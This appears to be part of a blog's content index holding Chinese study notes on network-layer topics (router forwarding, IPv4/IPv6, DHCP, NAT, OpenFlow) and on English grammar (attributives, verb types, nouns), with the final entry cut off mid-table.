0010</td><td>0</td></tr><tr><td>11001000 00100011</td><td>1</td></tr><tr><td>11001000 011</td><td>2</td></tr><tr><td>其他</td><td>3</td></tr></tbody></table><blockquote><p>如果匹配多项, 则会挑前缀最长的那项, 越长越精确</p><p>cisco catalyst 6500, 7600系列有一百万个TCAM转发表条目</p></blockquote><p>为了更快的(ns)在转发表中查找, 一般选择使用<code>SRAM</code>和<code>TCAM</code>存储器.</p><p>确定输出端口后, 就将数据包发给交换结构(牵扯到排队拥塞调度),  <strong>查找</strong>是输入端口中最重要的一个功能, 除此之外还有</p><ul><li>进行物理与链路层处理</li><li>检查数据包的版本号, 校验, 生存时间</li><li>更新网络管理的计数器</li></ul><h3 id="4-2-2-交换结构-switching-fabric-细节"><a href="#4-2-2-交换结构-switching-fabric-细节" class="headerlink" title="4.2.2-交换结构(switching fabric)细节"></a>4.2.2-交换结构(switching fabric)细节</h3><p>是路由器的核心, 有多种数据包交换(指从输入端口到输出端口)方式</p><ol><li><p>通过内存转发.</p><p>输入输出相当于操作系统的IO, CPU(路由处理器)从数据包首部取出目的地址, 在转发表中找到输出端口后, 就将数据包复制到输出端口的缓冲区.(即使有不同的输出端口, 但因为是共享系统总线, 一次只能进行一次读写, <em>区别线路卡</em>)</p><p>许多路由器都使用内存交换技术。然而，目的地址的查找和将分组存储(交换)进适当的存储位置是由输入线路卡上的处理器来执行的。</p></li><li><p>通过总线转发.</p><p>输入端口通过共享总线将数据包直接转送到输出端口, 不需要路由处理器.</p><p>虽然CPU没有涉及总线传送, 但因为总线共享, 还是只能一次传送一个数据包. 当数据包到达输入端口, 如果发现总线在忙, 他就会被阻塞(数据包进入内存需要通过总线).</p></li><li><p>通过互连网转发.</p><p>使用互连网络, 可以克服共享总线带宽的限制, 当不同输入端口转发到不同输出端口时, 能够并行转发</p></li></ol><h3 id="4-2-3-排队"><a href="#4-2-3-排队" class="headerlink" title="4.2.3-排队"></a>4.2.3-排队</h3><p>将输入链路速率和输出速率相等设为R, 交换结构处理速率设为L</p><ul><li><p>R&lt;&lt;L</p><p>不存在输入排队, 存在输出排队</p></li><li><p>R&gt;L</p><p>存在输入排队, 并且存在HOL(Head of the line)阻塞, 即排队第一个数据包被阻塞, 后面的数据包也会被影响</p></li></ul><h3 id="4-2-4-数据包调度"><a href="#4-2-4-数据包调度" class="headerlink" title="4.2.4-数据包调度"></a>4.2.4-数据包调度</h3><p>如何处理排队, 这就是调度</p><h4 id="1-FIFO-FCFS"><a href="#1-FIFO-FCFS" class="headerlink" title="1.FIFO(FCFS)"></a>1.FIFO(FCFS)</h4><p>先进先出(先到先服务)指的是<strong>按照到达顺序</strong>将队列数据包进行链路传输, 先到的先被处理</p><h4 id="2-优先级"><a href="#2-优先级" class="headerlink" title="2.优先级"></a>2.优先级</h4><p>到达的数据包会进行分类, 高优先级队列的会比低优先级队列的先被传输, 优先级相同的数据包采用FIFO处理 </p><h4 id="3-轮循-RR-和加权公平排队-WFQ"><a href="#3-轮循-RR-和加权公平排队-WFQ" class="headerlink" title="3.轮循(RR)和加权公平排队(WFQ)"></a>3.轮循(RR)和加权公平排队(WFQ)</h4><p>轮循就是循环不同的队列来发送数据包. </p><p>WFQ与RR有点像, 但它为每一个队列进行<strong>加权</strong>, 避免优先级低的得不到服务, 还有就是采用轮循, 当队列为空时, 立刻切换到下一个队列</p><h2 id="4-3-IPv4-IPv6"><a href="#4-3-IPv4-IPv6" class="headerlink" title="4.3-IPv4, IPv6"></a>4.3-IPv4, IPv6</h2><h3 id="IPv4数据报格式"><a href="#IPv4数据报格式" class="headerlink" title="IPv4数据报格式"></a>IPv4数据报格式</h3><p>对于网络, IP可以说是最为重要的一部分了(寻址, 转发), 下图就是IPv4报头的组成部分</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/ip-v4-format.png" alt=""></p><ul><li><code>version</code>: 占4bit, IP协议的版本号, 路由器根据不同的版本来解析IP数据报头</li><li><code>Headerlength</code>: 4bits, 代表IP头的长度, 用来确定有效载荷, 典型的IP头是20字节(不包含该选项)</li><li><code>Type of service</code>:  8bits, 服务类型用来区分不同类型的数据报(设置优先级), 如IP电话和FTP的数据报</li><li><code>Datagram length</code>: 16bits, 代表IP数据报的总长度(IP头+数据), 单位字节(因为以太网帧的原因通常不超过1500字节)</li><li><code>Identifier(16bit),Flags(3bit),Fragmentation(13bit) offset</code>: 标识符, 标志, 碎片偏移与IP分片有关.(IPv6没有分片)</li><li><code>Time to live(8bit)</code>: TTL表示生存时间, 每经路由处理, 这个字段都要-1, 到达0时则丢弃该数据, 防止在网络中一直流通</li><li><code>Upper-layer protocol(8bit)</code>: 指定传递的上层协议, 如6表示TCP, 17表示UDP, <a href="https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml">参见IANA</a>. 类似传输层的端口, 将传输层与应用层粘合, 协议号将网络层与传输层粘合</li><li><code>Header checksum(16bit)</code>: 标头校验和, 它只校验IP首部, 错误就丢弃, 这里要区分TCP/UCP的校验和, 它们是在整个段计算校验的.</li><li><code>源IP和目标IP</code>: 源主机从DNS获取目标IP, 插入目标IP字段</li><li><code>options</code>: 选项是对IP头的扩展, 出去性能考虑一般不怎么使用, IPv6没有该字段</li><li><code>Data(有效负载)</code>:　如TCP段内容</li></ul><blockquote><p>没有选项字段的IP头有20字节</p></blockquote><h3 id="IP数据包分段"><a href="#IP数据包分段" class="headerlink" title="IP数据包分段"></a>IP数据包分段</h3><p>链路层协议支持发送规定范围内的数据包, 如以太网帧可以容纳1500byte, 链路层MTU(maximum transmission unit, 最大传输单位)限制了链路层帧的最大容量, IP数据包会被封装在链路层帧中, 所以MTU会对IP数据包的长度限制.</p><p>但是不同的路由器可能有不同的链路层协议, 有着不同的MTU. 当一个路由器的下一个路由器的MTU&lt;该路由的IP数据包长度, 这怎么办? 方法是将IP数据包再次拆分, 然后单独封装. 小的数据包称之为<code>fragment(片段)</code>.</p><p>片段需要组装才能到达目的地的传输层, 为了保证路由器的性能, 将重组的工作交给了终端系统.</p><p>源主机会在数据包中标记源-目的地址和标示号, 每个数据包(分片)都有, 目的通过检查标识号来知道该数据包是否是某个大数据包的片段. 由于IP不可靠, 会丢失片段, 需要使用偏移量来确定该片段的顺序, 使用标志位来确定最后一个数据包(0标识)</p><h3 id="IP寻址"><a href="#IP寻址" class="headerlink" title="IP寻址"></a>IP寻址</h3><p>IPv4长度32位, 约有43亿个IPv4地址, 通常表示为十进制, 每字节使用<code>.</code>隔开, 如192.168.1.1</p><p>主机和路由如何链接互联网? 主机网络接口连接一条网络链路, 通过该链路发送信息. 路由器也有接口, 但它需要在一个链接上接受, 在另一个链接上传输, 需要两个及以上的连接, 所以路由有多个接口. 每个接口都需要发送/接受数据, IP协议要求每个接口都需要有自己的IP. 所以IP与接口关联, 不与机器关联.</p><blockquote><p>全局Internet中每个主机和路由器上的每个接口必须具有全局唯一的IP地址(后面会说NAT), 接口IP地址由他的子网决定</p><p>说一下192.168.1.0/24表示法: 也叫子网掩码, 代表前24位定义了子网地址</p><p>子网: 将每个接口与主机和路由断开, 连续的线路就是一个子网</p><p>子网里面的所有设备都具有相同的子网地址</p></blockquote><p>无类别域间路由Classless Interdomain Routing (CIDR)规定了子网寻址的概念, 它将IP地址分为两部分, <code>a.b.c.d/x</code>, a-d是十进制的IP地址, x是最高有效位, 构成IP地址的网络部分, 称为<strong>网络前缀</strong>. 通常为某个组织分配一个前缀, 然后该组织的所有设备都共享这个前缀.</p><p><code>32-x</code>位可以区分组织内的设备, <code>32-x</code>也可以有组织内的子网</p><blockquote><p>前缀能减少路由器转发表的大小, a.b.c.d/x的形式足以将数据包转发到任何目的地</p><p>使用单个前缀告知自己有多个网络的能力叫<code>路由聚合</code></p></blockquote><hr><p>在使用CIDR之前, IP的网络部分被设置为8bit, 16bit, 24bit长度, 分别叫做A, B, C类网络, C类只能有$2^8-2=254$个IP地址(2个IP有其他作用), 而B类能有$2^{16}-2=65534$的IP地址. 假设某组织需要分配300个IP地址, 只能为其分配B类的子网地址, 空余65000个IP地址, 浪费了太多空间, 而且B类网络地址也会很快耗尽.</p><blockquote><p>当主机的发送目标为IP广播地址255.255.255.255时, 该数据包会发送给子网内的所有主机,  路由器一般不会转发</p><p>ICANN非盈利性组织负责分配IP和管理DNS根服务器等工作</p></blockquote><h4 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h4><p>当组织获取到IP地址块后, 可以手动将IP分配给路由器和主机, 也可以通过<code>DHCP</code>(<code>Dynamic Host Configuration Protocol</code>,动态主机配置协议)自动配置(可以固定IP或者临时IP), 主机通过<code>DHCP</code>还可以获得子网掩码, 默认网关(第一跳路由器地址), 本地DNS服务器地址等.</p><p><code>DHCP</code>是基于<code>CS</code>的协议, 每个子网都至少有一个<code>DHCP服务器</code>, 或者知道DHCP服务器地址的DHCP的代理(路由器)</p><p>连上网络的主机想在DHCP协议下获取IP分为四步, 如图所示(yiaddr代表you internet address):</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/DHCP-CS-interaction.png" alt="DHCP-CS-interaction"></p><ol><li><p><code>DCHP discover</code>: 为了找到DHCP服务器, 客服端会使用UDP数据包发送<code>DCHP discover</code>消息, DHCP服务端使用67端口, 客户端使用68接口, 由于没有IP, 客服端会以广播IP地址255.255.255.255和自身IP地址0.0.0.0建立IP数据报传递到链路层, 链路层会广播到子网内所有的节点.</p></li><li><p><code>DCHP offer</code>: 服务端接受到信息后进行响应, 图中使用广播地址, 书中理由是因为可能有多个DHCP服务器, 广播可以让客户端选择合适的地址.</p><p><u><strong>但我并不信服这个理由, 就算是单播也能让客户端进行选择啊</strong></u>.</p><p><strong>上网查了下, 可以在DHCP Discovery / Request报文里设置<code>BROADCAST flag = 0</code>来代表单播</strong>.</p><blockquote><p>抓包得到Bootp flags: 0x0000 (Unicast)表示单播</p></blockquote><p>响应的消息会带有唯一会话ID, 建议的IP地址, 网络掩码, IP使用时间</p><blockquote><p>为什么要分为单播和广播?</p><p>单播: 点对点, 不影响其他主机</p><p>广播: 点对所有点, 会影响到子网内其他主机</p><p>如果协议栈在初始化中不支持单播, 则使用广播</p><p>如果支持则使用单播</p></blockquote></li><li><p><code>DHCP request</code>: 客服端将到达的offer进行选择, 回显该提议的参数.</p></li><li><p><code>DHCP ACK</code>: 服务端确认该消息, 交互完成</p></li></ol><blockquote><p>书说DHCP的缺点是<u>每连接到一个新的子网都会得到一个新的IP地址, 当在子网之间移动无法维持远程应用的TCP连接</u>, <strong>不是很理解, 子网之间代表不同的子网, 子网不同IP还能相同?</strong></p><p>网上找的缺点还有点像样, 如DHCP服务器无法知道其他DHCP服务器租出去的地址, 不能发现非DHCP使用的IP地址</p></blockquote><h3 id="网络地址转换NAT"><a href="#网络地址转换NAT" class="headerlink" title="网络地址转换NAT"></a>网络地址转换NAT</h3><p>IPv4总共就40亿多地址, 现在每个人都不只一个智能设备, 加上智能家居, 导致了IP的极度稀缺, 于是有了NAT<code>Network Address Translation</code>这个暂时策略</p><blockquote><p><strong>专有名词</strong></p><p>公网IP: 通过ISP等途径获得的全球统一可寻址的地址</p><p>私有IP: 内部地址, IANA保留了三类私有地址<a href="https://tools.ietf.org/html/rfc1918">RFC 1918</a></p><p>10.0.0.0 - 10.255.255.255 (10/8)</p><p>172.16.0.0 - 172.31.255.255 (172.16/12)</p><p>192.168.0.0 - 192.168.255.255 (192.168/16)</p><p>详细分类</p><figure class="highlight plaintext"><figcaption><span>block >folded</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Address Block                    Name                              RFC                       </span><br><span class="line">0.0.0.0/8                        &quot;This host on this network&quot;       [RFC1122], section 3.2.1.3</span><br><span class="line">10.0.0.0/8                       Private-Use                       [RFC1918]                 </span><br><span class="line">100.64.0.0/10                    Shared Address Space              [RFC6598]                 </span><br><span class="line">127.0.0.0/8                      Loopback                          [RFC1122], section 3.2.1.3</span><br><span class="line">169.254.0.0/16                   Link Local                        [RFC3927]                 </span><br><span class="line">172.16.0.0/12                    Private-Use                       [RFC1918]                 </span><br><span class="line">192.0.0.0/24[2]                  IETF Protocol Assignments         [RFC6890], section 2.1    </span><br><span class="line">192.0.0.0/29                     IPv4 Service Continuity Prefix    [RFC7335]                 </span><br><span class="line">192.0.0.8/32                     IPv4 dummy address                [RFC7600]                 </span><br><span class="line">192.0.0.9/32                     Port Control Protocol Anycast     [RFC-ietf-pcp-anycast-08] </span><br><span class="line">192.0.0.170/32, 192.0.0.171/32   NAT64/DNS64 Discovery             [RFC7050], section 2.2    </span><br><span class="line">192.0.2.0/24                     Documentation (TEST-NET-1)        [RFC5737]                 </span><br><span class="line">192.31.196.0/24                  AS112-v4                          [RFC7535]                 </span><br><span class="line">192.52.193.0/24                  AMT                               [RFC7450]                 </span><br><span class="line">192.88.99.0/24                   Deprecated (6to4 Relay Anycast)   [RFC7526]                 </span><br><span class="line">192.168.0.0/16                   Private-Use                       [RFC1918]                 </span><br><span class="line">192.175.48.0/24                  Direct Delegation AS112 Service   [RFC7534]                 </span><br><span class="line">198.18.0.0/15                    Benchmarking                      [RFC2544]                 </span><br><span class="line">198.51.100.0/24                  Documentation (TEST-NET-2)        [RFC5737]                 </span><br><span class="line">203.0.113.0/24                   Documentation (TEST-NET-3)        [RFC5737]                 </span><br><span class="line">240.0.0.0/4                      Reserved                          [RFC1112], section 4      </span><br><span class="line">255.255.255.255/32               Limited Broadcast                 [RFC919], section 7 </span><br></pre></td></tr></table></figure><p>外网IP: 相对私有IP来说, 外网IP可能是私有IP, 公网IP</p><p>LAN: 局域网接口, 接上后分配私有IP</p><p>WAN: 这个接口可以与运营商联系, 这并不代表是公网IP</p></blockquote><h4 id="NAT技术原理"><a href="#NAT技术原理" class="headerlink" title="NAT技术原理"></a>NAT技术原理</h4><p>NAT路由器通过WAN口连接一个可以与外界联系的IP地址(外网IP), 通过许多LAN口连接局域网的设备, 并分配内网地址.</p><p> 当内网需要请求外网的的数据时, 把请求数据发给NAT路由器, NAT路由器会替换该数据的内网IP成外网IP,  使用现存端口替换原有端口, 将替换过程记录到NAT转发表, 数据到达NAT路由器时根据转发表发送给内网设备</p><blockquote><p>NAT路由器会运行DHCP服务器给内网设备提供IP地址</p></blockquote><p>优点: 稍微解决了IP不够用的问题</p><p>缺点: 端口是寻找进程的, 在服务器上, NAT会导致服务端口失效, 如<strong>P2P</strong>, 现在的解决方法是<u>NAT穿越</u></p><blockquote><p><strong>关于网络安全</strong></p><p>攻击者通过向IP发送恶意数据包来对主机进行攻击, 还可以进行ping扫描和端口扫描.</p><p>防火墙可以  端口扫描和根据IP来拦截数据包. IDS(intrusion detection systems)会对数据包进行全身扫描, 还会对攻击的数据包签名, 可以保护主机免受已知攻击</p></blockquote><h3 id="IPv6数据报格式"><a href="#IPv6数据报格式" class="headerlink" title="IPv6数据报格式"></a>IPv6数据报格式</h3><p>随着时间的推移, IPv4逐渐用尽, 根本的解决方法是升级IP协议的版本, 让它有更多的地址可以分配.</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/ip-v6-format.png" alt="ip-v6-format"></p><p><em>字段解读</em></p><p><code>version(4bit)</code>：版本, IPv4是４, IPv6是6</p><p><code>Traffic class(8bit)</code>: 同IPv4的<a href="#IPv4数据报格式">TOS</a>, 可以为数据报设置优先级</p><p><code>Flow lable(20bit)</code>: 流标签, 标识数据流</p><p><code>Payload length(16bit)</code>: 有效负载的长度, 代表数据头后面的数据报字节数</p><p><code>Next header(8bit)</code>: 标识传递的上层协议</p><p><code>Hop limit(8bit)</code>: 代表可以经过(跳)路由的次数, 每经过一个路由则-1, 到0则被丢弃</p><p><code>src&amp;Dst address</code>: 128bit的地址</p><blockquote><p><a href="https://datatracker.ietf.org/doc/rfc4291/?include_text=1">查阅rfc4921</a></p><p>IPv6的表示形式:</p><ol><li><p>8个16bit</p><p><code>ABCD:EF01:2345:6789:ABCD:EF01:2345:6789</code></p><p><code>2001:DB8:0:0:8:800:200C:417A</code></p></li><li><p>省略0</p><p><code>2001:DB8:0:0:8:800:200C:417A</code></p><p><code>2001:DB8::8:800:200C:417A</code></p></li></ol></blockquote><p><code>Data</code>: 传递到目的主机网络层的上层</p><p>相对比IPv4, IPv6少了碎片<code>重组</code>, <code>头部校验和</code>, <code>选项</code>.</p><ul><li>如果数据报在路由器中过大, 则路由器会丢弃这个数据报, 并反馈给发送方, 发送方会调小数据报然后重新发送</li><li>因为链路层+传输层都有校验, 而且每次<a href="#IPv4数据报格式">TTL</a>都会变化, IPv4的校验和都会重新计算, 比较耗资源, 所以IPv6觉得冗余删除了校验</li><li>选项在报头不存在了, 但<code>Next header</code>可以指向它, 删除它主要是为了IPv6精简的40字节报头.</li></ul><h3 id="将IPv4升级为IPv6"><a href="#将IPv4升级为IPv6" class="headerlink" title="将IPv4升级为IPv6"></a>将IPv4升级为IPv6</h3><p>虽然IPv6向下兼容IPv4, 但现有的IPv4的系统并不支持IPv6, 不可能停用全球所有的支持IPv4的系统来升级IPv6</p><p><strong><em>隧道技术</em></strong></p><p>在两台IPv6的设备之间如果有IPv4的设备, 则会将IPv6整段报文放进IPv4的有效负载段(标识41代表IPv6), 到达目的地提取该IPv6数据段, 中间的IPv4设备就叫<code>隧道</code></p><h2 id="4-4-通用转发和SDN"><a href="#4-4-通用转发和SDN" class="headerlink" title="4.4-通用转发和SDN"></a>4.4-通用转发和SDN</h2><blockquote><p>数据包是基于IP发送的, 然IP是可以在路途中被修改的, 这些设备叫<code>中间盒</code></p></blockquote><p>以前介绍的转发是基于目标的转发, 根据查找目的IP(<code>匹配</code>), 然后将数据包转发给合适的端口(<code>操作</code>).</p><p><code>通用转发</code>代表更宽广的<code>匹配</code>+<code>操作</code>, 匹配会在不同的层中进行, 操作可以将数据包转发到一个或者多个端口; 执行的设备被称为<code>分组交换机</code>, 区别于链路层的交换机和网络层的路由器.</p><p><code>OpenFlow</code>(这是一个标准)将匹配和启动转发的条目称为<code>flow table(流表)</code>, 特点是</p><ul><li>一组和输入数据包可以<code>匹配的标头字段</code>, 采用硬件匹配(TCAM), 匹配则转发, 否则丢弃或交给远程控制</li><li>随数据包和流表条目更新的<code>计数器</code>, 可以记录匹配数据包的数量和流表更新时间</li><li><code>匹配的动作</code>, 有转发到指定端口, 丢弃, 复制到其他端口, 重写标头字段</li></ul><blockquote><p><strong><em>Match(匹配字段)</em></strong></p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/openflow-match-table.png" alt="openflow-match-table"></p><p>详细的Openflow协议参考</p><p><a href="https://zhuanlan.zhihu.com/p/57201400">OpenFlow协议初探——OpenFLow中的流和流表</a></p><p>具体的action有: 跨多个输出接口(负载均衡)、重写报头(NAT), 阻塞/丢弃数据包(防火墙).</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> Top-Down-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DHCP </tag>
            
            <tag> IP </tag>
            
            <tag> SDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>02-定语/动词</title>
      <link href="/English/G/02-%E5%AE%9A%E8%AF%AD%E5%8A%A8%E8%AF%8D.html"/>
      <url>/English/G/02-%E5%AE%9A%E8%AF%AD%E5%8A%A8%E8%AF%8D.html</url>
      
        <content type="html"><![CDATA[<p> 前面说的名词是词性，而主语是成分.</p><p>名词可以做<strong>主语</strong>，<strong>宾语</strong>，<strong>表语</strong>，<strong>同谓语</strong>，<strong>宾补</strong>.</p><p>而主语也是由６种名词类型充当的</p><span id="more"></span><h2 id="定语"><a href="#定语" class="headerlink" title="定语"></a>定语</h2><ul><li>修饰名词（能将名词范围从大变小(笼统–&gt;具体)）</li><li>形容词性</li></ul><p><strong>One-third of the students in this class are girls.</strong></p><p>One-third是主语,the students是定语(将1/3的范围缩小了),in this class又把the students缩小了.</p><h3 id="1-定语分类"><a href="#1-定语分类" class="headerlink" title="1.定语分类"></a>1.定语分类</h3><p>可以把定语分为两类</p><h4 id="前置定语"><a href="#前置定语" class="headerlink" title="前置定语"></a>前置定语</h4><ul><li>a <strong>good</strong> boy.(单个,独立,不一定只有一个)</li></ul><h4 id="后置定语"><a href="#后置定语" class="headerlink" title="后置定语"></a>后置定语</h4><ul><li>a boy <strong>under the tree</strong>.(短语,句子)</li></ul><h3 id="2-定语构成"><a href="#2-定语构成" class="headerlink" title="2.定语构成"></a>2.定语构成</h3><h4 id="副词用作定语"><a href="#副词用作定语" class="headerlink" title="副词用作定语"></a><strong>副词用作定语</strong></h4><p>为什么说副词用作定语呢,副词不是修饰动词的吗?</p><p>相当于省略掉了动词,如下例子</p><ul><li>People (<del>living/being</del>)<strong>there</strong> are very friendly.</li><li>He didn’t like the man (<del>living</del>)<strong>downstairs</strong>.</li></ul><h4 id="形容词短语作定语"><a href="#形容词短语作定语" class="headerlink" title="形容词短语作定语"></a><strong>形容词短语作定语</strong></h4><ul><li>The <strong>next</strong> man is a scientist.</li><li>The man <strong>next to me</strong> is a scientist.</li></ul><h4 id="介词短语作定语"><a href="#介词短语作定语" class="headerlink" title="介词短语作定语"></a><strong>介词短语作定语</strong></h4><ul><li>The boy <strong>under the tree</strong> is Tom.</li><li>The <strong>tallest</strong> boy <strong>in our class</strong> is John.</li></ul><h4 id="现在分词短语、过去分词短语、动词不定式做定语"><a href="#现在分词短语、过去分词短语、动词不定式做定语" class="headerlink" title="现在分词短语、过去分词短语、动词不定式做定语"></a><strong>现在分词短语、过去分词短语、动词不定式做定语</strong></h4><ul><li>I have something <strong>to say</strong>.(to say将something缩小了)</li><li>The boy <strong>crying over there</strong> is my classmate.</li><li>The house <strong>built last year</strong> is impressive.</li></ul><h4 id="定语从句"><a href="#定语从句" class="headerlink" title="定语从句"></a>定语从句</h4><ul><li>He still remember the day <strong>when he first stepped into the Old Trafford</strong>.</li></ul><h2 id="动词"><a href="#动词" class="headerlink" title="动词"></a>动词</h2><p>谓语就是由动词构成的.</p><p>动词可以构成谓语和非谓语.</p><p>动词又分为以下几类：</p><h3 id="助动词"><a href="#助动词" class="headerlink" title="助动词"></a>助动词</h3><p>起辅助作用，不能单独构成谓语．</p><h4 id="be动词"><a href="#be动词" class="headerlink" title="be动词"></a><strong>be动词</strong></h4><p>常用: am、is、are、was、were、be</p><p>用法: be+doing/done.</p><h4 id="情态动词"><a href="#情态动词" class="headerlink" title="情态动词"></a><strong>情态动词</strong></h4><p><strong>常用</strong></p><ul><li>can、could (能够)</li><li>will、would (将要)</li><li>shall、should (应该)</li><li>may、might (可能)</li><li>must、[have to] (必须)</li><li>need、dare (需要)</li><li>had better (最好)</li></ul><p><strong>用法</strong>: 情态+do.</p><p><strong>特点</strong></p><ol><li>不能单独构成谓语</li><li>后接动词原形(+do)</li><li>无人称变化(I can..He can..)</li><li>有自身含义</li></ol><h4 id="狭义助动词"><a href="#狭义助动词" class="headerlink" title="狭义助动词"></a><strong>狭义助动词</strong></h4><p>常用: do、does、did</p><p>用法: +do</p><h4 id="完成助动词"><a href="#完成助动词" class="headerlink" title="完成助动词"></a><strong>完成助动词</strong></h4><p>帮助构成完成时.</p><p>常用: have、has、had</p><p>用法: +done.</p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ol><li>帮助构成时态<ul><li>The boy <u>is crying</u>.(进行)</li><li>He <u>has arrived</u>.(完成)</li><li>I <u>have been painting</u> all day.(完成+进行)</li></ul></li><li>帮助构成否定句和疑问句<ul><li><strong>Does</strong> he <strong>like</strong> English?(疑问)</li><li>He <strong>doesn’t have</strong> lunch at home.(否定)</li></ul></li><li>帮助构成被动语态<ul><li>Trees <strong>are planted</strong> in spring.(被动)</li><li>The house <strong>has been pulled</strong> down.(完成+被动)</li></ul></li><li>*帮助构成虚拟语气<ul><li>If he <strong>had come</strong> yesterday, I wouldn’t have made such a mistake.</li></ul></li><li>*帮助构成到装句<ul><li>So much did he love his mother that he bought her many presents on her birthday.</li></ul></li><li>帮助构成强调意义<ul><li>He did come yesterday.</li></ul></li></ol><blockquote><p>He <strong>did(实义)</strong> his homework at seven o’clock.</p><p><strong>Did(助)</strong> he <strong>do(实义)</strong> his homework yesterday?</p></blockquote><h3 id="实义动词"><a href="#实义动词" class="headerlink" title="实义动词"></a>实义动词</h3><p>也叫行为动词，<strong>表示具体的动作</strong>（分为外部：打你，内部：爱你）</p><h4 id="及物动词vt"><a href="#及物动词vt" class="headerlink" title="及物动词vt"></a>及物动词vt</h4><p>后面需要接宾语(S+V+O): I love you.[动宾]</p><h4 id="不及物动词vi"><a href="#不及物动词vi" class="headerlink" title="不及物动词vi"></a>不及物动词vi</h4><ul><li>不接宾语(S+V): Time flies.</li><li>使用<strong>介词</strong>连接宾语<ul><li>(S+V+O): I look <strong>at</strong> the man[介宾]doesn’t have</li><li>(S+V): The meeting began at six.</li></ul></li></ul><h3 id="系动词"><a href="#系动词" class="headerlink" title="系动词"></a>系动词</h3><p>后面接表语，表示主语是什么或怎么样，<strong>不表具体动作</strong></p><h4 id="表状态"><a href="#表状态" class="headerlink" title="表状态"></a>表状态</h4><p>doesn’t haveBe,stay,keep,remain,lie,stand,exist</p><h4 id="表感官"><a href="#表感官" class="headerlink" title="表感官"></a>表感官</h4><p>fell,smell(闻),taste(尝),look,sound</p><h4 id="表变化"><a href="#表变化" class="headerlink" title="表变化"></a>表变化</h4><p>become,go,get,turn,fall</p><h4 id="表像"><a href="#表像" class="headerlink" title="表像"></a>表像</h4><p>seem,appear(似乎，好像)</p><blockquote><p>动词分类的问题：</p><p>Be是助动词、实义动词，还是系动词？</p><ul><li>看他是否辅助动词进行判断助动词和实义动词<ul><li>He is(助) playing(实义) football.</li><li>He is(助) asked(实义) to do this job.</li></ul></li><li>看它是否表示具体的动作可以区分系动词<ul><li>He is(系) a student(状态).</li><li>His hobby is(系) playing football(这是爱好，没有具体的动作).</li></ul></li></ul><p>区分实义动词和系动词</p><ul><li>He goes(实义) to school by bike.</li><li>The food goes(系) bad.(表变化)</li><li>He turns(实义) around.</li><li>The leaves turns(系) yellow.(表变化)</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>01-什么是名词？</title>
      <link href="/English/G/01-%E5%90%8D%E8%AF%8D.html"/>
      <url>/English/G/01-%E5%90%8D%E8%AF%8D.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>零基础自学英语第一天，什么是名词？<br>声明：此分类笔记参考 morty 老师的课程。</p></blockquote><span id="more"></span><p>句子=主语 (noun)+ 谓语 (verb)</p><p>主语就由名词构成，名词有很多类型</p><h2 id="名词短语"><a href="#名词短语" class="headerlink" title="名词短语"></a>名词短语</h2><p>例如：a good boy.</p><p>名词短语由下面部分组成</p><p>限定词 + 修饰词 (adj)+ 主体词 (n)</p><table><thead><tr><th>限定词构成</th><th></th></tr></thead><tbody><tr><td>冠词</td><td>a,an,the..</td></tr><tr><td>形容性物主代词</td><td>my,this…</td></tr><tr><td>名词所有格</td><td>one’s,Tom’s..</td></tr><tr><td>指示代词</td><td>this,that..</td></tr><tr><td>不定代词</td><td>some,every,another..</td></tr><tr><td>基数词</td><td>one,two…</td></tr><tr><td>疑问代词</td><td>what,which…</td></tr></tbody></table><p>组成名词短语 (有一些可以省略)</p><p><strong>省略修饰词</strong></p><ul><li>a good boy.</li><li>a boy.</li></ul><p><strong>省略限定词</strong></p><ul><li><p>Cs(Countable noun,s 表示复数) 情况下</p><ul><li>boys.</li><li>good boys.</li></ul></li><li><p>U(Uncountable noun)</p><ul><li>good news</li><li>news</li></ul></li></ul><p><strong>专有名词 (省略限定词，修饰词)</strong></p><ul><li>China</li><li>Tom</li></ul><p><strong>省略主语</strong></p><p>主体词在<strong>笼统、明显</strong>的情况下可以省略</p><ul><li>the rich (people)</li><li>the best (student)</li><li>these (books)</li></ul><h2 id="可数名词和不可数名词"><a href="#可数名词和不可数名词" class="headerlink" title="#可数名词和不可数名词"></a>#可数名词和不可数名词</h2><p><strong>可数</strong></p><ul><li>单数（a/an）</li><li>复数<ul><li>规则</li><li>不规则</li></ul></li></ul><p><strong>不可数</strong></p><ul><li>直接写</li><li>量化</li><li>可数化</li></ul><h2 id="代词"><a href="#代词" class="headerlink" title="代词"></a>代词</h2><h3 id="1-人称代词"><a href="#1-人称代词" class="headerlink" title="1.人称代词"></a>1.人称代词</h3><table><thead><tr><th>主格 (<code>S主</code>)</th><th>宾格 (<code>O宾，P 表</code>)</th><th>形物代 